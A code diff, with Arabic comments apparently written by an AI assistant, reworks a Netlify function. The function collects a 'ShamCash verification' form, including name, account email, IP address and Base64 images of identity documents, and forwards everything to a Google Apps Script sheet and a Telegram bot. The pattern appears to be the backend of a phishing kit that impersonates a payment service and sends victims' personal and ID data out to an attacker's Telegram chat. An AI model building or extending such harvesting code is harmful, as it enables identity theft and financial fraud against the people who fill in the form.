@@ -24,65 +24,34 @@ exports.handler = async function(event, context) {
         };
     }
 
-    let formData;
-    let files = {}; // لتحميل الملفات
+    let requestBody;
     let userIpAddress = 'غير معروف';
 
-    // معالجة البيانات المرسلة كـ FormData (التي تحتوي على JSON والملفات)
+    // Netlify Functions تحلل event.body تلقائيا إذا كان Content-Type هو application/json
+    // ولكن إذا كان Content-Type هو multipart/form-data (لتحميل الملفات)، فإن event.body سيكون Raw
+    // هذا يتطلب معالجة خاصة.
+    // بما أننا قررنا تحويل الصور إلى Base64 في الواجهة الأمامية وإرسالها كـ JSON،
+    // فإن event.body سيكون JSON.
+
     try {
-        // Netlify Functions تتعامل مع FormData بتحليلها في event.body
-        // ولكن للحصول على الملفات، قد تحتاج إلى مكتبة لتحليل multipart/form-data
-        // Netlify تتعامل معها جزئياً، لكن يفضل إرسال الملفات كـ base64 إذا كان حجمها صغيراً
-        // لتبسيط العملية الآن، سنفترض أننا نرسل النصوص فقط.
-        // لرفع الملفات الكبيرة، يجب أن يتم رفعها إلى خدمة تخزين مثل Cloudinary/Imgur أولاً
-        // ثم إرسال روابطها إلى Google Sheet. سأقدم لك حلاً مبسطاً لرفع الملفات كبيانات
-        // أو أطلب منك التفكير في خدمة خارجية للصور لاحقاً إذا كانت صوراً حقيقية.
-
-        // بما أن كودك الأمامي يستخدم FormData ويرسل payload كـ JSON String،
-        // سنحتاج إلى تحليلها هنا.
-        const parsedBody = parse(event.body, { /* options for querystring.parse */ }); // هذا ليس FormData فعليًا
-        // الخطأ هنا أن Netlify functions لا تحلل FormData تلقائياً إلى JSON.
-
-        // **تصحيح:** يجب أن نغير طريقة إرسال FormData من الواجهة الأمامية
-        // بحيث يتم إرسال البيانات النصية كـ JSON، والملفات بشكل منفصل أو بعد تحويلها
-        // لتبسيط هذا المثال ولتجنب تعقيد تحميل الملفات مباشرة إلى Google Apps Script
-        // عبر وظيفة Netlify (وهو أمر معقد)، سأفترض أننا نرسل بيانات نصية فقط.
-        // إذا كانت صوراً حقيقية يجب تحميلها، فسنحتاج إلى تغيير كبير في استراتيجية تحميلها.
-        // لغرض هذا المثال، سأعيد الكود ليتعامل مع JSON فقط مبدئياً.
-        // ثم نضيف معالجة الملفات لاحقا إذا أكدت أنها ضرورية جدا وأنك موافق على تعقيدها.
-
-        // **تعديل: وظيفة Netlify لا تستقبل FormData مباشرة كما في المتصفح**
-        // يجب أن يتم إرسال البيانات النصية كـ JSON
-        // والملفات (الصور) يجب أن تُحول إلى Base64 في الواجهة الأمامية وتُرسل كجزء من JSON
-        // أو تُرفع إلى خدمة تخزين صور خارجية (مثل Cloudinary) أولاً.
-
-        // بما أنك تريد "تحميل صورة"، فإن أفضل طريقة هي تحويلها إلى Base64 في الواجهة الأمامية (JS)
-        // ثم إرسالها ضمن JSON إلى Netlify Function، ثم Netlify Function ترسلها إلى Google Apps Script.
-        // هذه طريقة ممكنة للصور الصغيرة. للصور الكبيرة، يفضل رفعها لخدمة خارجية أولاً.
-
-        // **لتبسيط الأمر الآن، سأجعل الوظيفة تتوقع JSON عادي.**
-        // هذا يعني أننا سنحتاج إلى تحويل الصور إلى Base64 في verify.js قبل الإرسال.
-        // سأقدم لك التعديلات المطلوبة في verify.js لاحقاً.
-
-        formData = requestBody.payload; // البيانات النصية
-        userIpAddress = requestBody.ipAddress; // IP
-        // الملفات (الصور) ستكون مشفرة بـ Base64 ضمن الـ payload الآن
-
+        requestBody = JSON.parse(event.body);
+        userIpAddress = requestBody.payload.ipAddress; // IP الآن جزء من الـ payload
+        // لا يوجد داعي لـ requestBody.ipAddress منفصل
     } catch (error) {
-        console.error('Error parsing request body or file data:', error);
+        console.error('Error parsing request body:', error);
         return {
             statusCode: 400,
-            body: JSON.stringify({ message: 'Invalid request data.' })
+            body: JSON.stringify({ message: 'Invalid JSON body.' })
         };
     }
 
+    const { type, payload } = requestBody; // 'payload' يحتوي على جميع بيانات النموذج والـ Base64 للصور
 
     // 1. إرسال البيانات إلى Google Apps Script Web App
     try {
         const googleSheetData = {
             action: 'addRecord', // إجراء سنعرفه في Google Apps Script
-            data: formData,
-            ip: userIpAddress
+            data: payload // نرسل كامل الـ payload الذي يحتوي على كل البيانات والصور Base64
         };
         const googleAppsScriptResponse = await axios.post(GOOGLE_APP_SCRIPT_WEB_APP_URL, googleSheetData);
         console.log('Google Apps Script Response:', googleAppsScriptResponse.data);
@@ -99,12 +68,12 @@ exports.handler = async function(event, context) {
     if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
         const telegramMessage = `
             <b>[حالة توثيق جديدة]</b>
-            <b>الاسم:</b> ${formData.fullName}
-            <b>البريد:</b> ${formData.shamcashEmail}
-            <b>الـ IP:</b> ${userIpAddress}
-            <b>نوع الحساب:</b> ${formData.accountType}
-            <b>سبب الطلب:</b> ${formData.verificationReason}
-            <b>نوع الوثيقة:</b> ${formData.documentType}
+            <b>الاسم:</b> ${payload.fullName || 'غير محدد'}
+            <b>البريد:</b> ${payload.shamcashEmail || 'غير محدد'}
+            <b>الـ IP:</b> ${userIpAddress || 'غير معروف'}
+            <b>نوع الحساب:</b> ${payload.accountType || 'غير محدد'}
+            <b>سبب الطلب:</b> ${payload.verificationReason || 'غير محدد'}
+            <b>نوع الوثيقة:</b> ${payload.documentType || 'غير محدد'}
         `;
         const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         try {
